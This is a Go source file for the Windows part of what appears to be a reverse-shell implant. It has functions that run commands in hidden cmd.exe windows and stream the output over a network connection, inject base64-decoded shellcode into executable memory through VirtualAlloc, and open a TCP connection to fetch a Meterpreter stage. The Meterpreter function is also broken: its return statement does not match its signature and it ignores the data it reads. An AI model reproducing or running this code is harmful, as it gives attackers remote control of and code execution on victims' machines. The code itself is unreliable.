// +build windows !linux !darwin !freebsd

package shell

import (
	"encoding/base64"
	"net"
	"os/exec"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

func GetShell() *exec.Cmd {
	cmd := exec.Command("C:\\Windows\\System32\\cmd.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd
}

func ExecuteCmd(command string, conn net.Conn) {
	cmd_path := "C:\\Windows\\System32\\cmd.exe"
	cmd := exec.Command(cmd_path, "/c", command+"\n")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}

func InjectShellcode(encShellcode string) {
	if encShellcode != "" {
		if shellcode, err := base64.StdEncoding.DecodeString(encShellcode); err == nil {
			go ExecShellcode(shellcode)
		}
	}
}

var procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")

func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
	ret, _, _ := procVirtualProtect.Call(
		uintptr(lpAddress),
		uintptr(dwSize),
		uintptr(flNewProtect),
		uintptr(lpflOldProtect))
	return ret > 0
}

func ExecShellcode(shellcode []byte) {
	// Resolve kernell32.dll
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	// Resolve VirtualAlloc
	VirtualAlloc := kernel32.MustFindProc("VirtualAlloc")
	// Reserve space to drop shellcode
	address, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	addrPtr := (*[990000]byte)(unsafe.Pointer(address))
	for i := 0; i < len(shellcode); i++ {
		addrPtr[i] = shellcode[i]
	}
	go syscall.Syscall(address, 0, 0, 0, 0)
}

func Meterpreter(address string) (bool, error) {
	var stage2Length []byte = make([]byte, 4)

	if conn, err := net.Dial("tcp", address); err != nil {
		return err
	}
	defer conn.Close()

	conn.Read(stage2Length)

	return true, nil
}
